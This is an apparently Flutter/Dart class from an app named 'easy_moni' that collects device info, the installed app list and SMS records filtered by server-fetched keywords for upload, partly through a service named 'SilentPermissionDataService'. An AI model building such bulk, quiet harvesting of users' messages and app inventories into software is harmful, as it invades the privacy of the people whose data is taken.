import 'package:easy_moni/services/platform_service.dart';
import 'package:easy_moni/services/upload_data/sms_keyword_provider.dart';
import 'package:easy_moni/services/upload_data/upload_platform_support.dart';

class UserUploadDataCollector {
  UserUploadDataCollector({required this.smsKeywordProvider});

  final SmsKeywordProvider smsKeywordProvider;

  /// 采集设备信息原始 JSON；采集失败或数据为空时跳过该字段上传。
  Future<dynamic> collectDeviceInfo() async {
    try {
      final data = await SilentPermissionDataService.collect();
      final deviceInfo = data['deviceInfo'];
      if (deviceInfo is Map && deviceInfo.isNotEmpty) {
        return deviceInfo;
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  /// 采集应用列表原始 JSON；iOS 不支持，采集失败时跳过该字段上传。
  Future<dynamic> collectAppList() async {
    if (!UploadPlatformSupport.supportsAppListAndSms) {
      return null;
    }

    try {
      final data = await SilentPermissionDataService.collect();
      final appList = data['appList'];
      if (appList is List && appList.isNotEmpty) {
        return appList;
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  /// 采集短信记录原始 JSON；非 Android 或未授权时直接跳过。
  Future<dynamic> collectSmsRecord() async {
    if (!UploadPlatformSupport.supportsAppListAndSms) {
      return null;
    }

    try {
      final hasPermission = await SmsService.checkPermission();
      if (!hasPermission) {
        return null;
      }

      final smsRecords = await SmsService.getSmsRecords(
        keywords: await smsKeywordProvider.fetchKeywords(),
        limit: SmsKeywordProvider.maxFilteredSmsCount,
      );
      if (smsRecords == null || smsRecords.isEmpty) {
        return null;
      }

      return smsRecords;
    } catch (error) {
      return null;
    }
  }
}
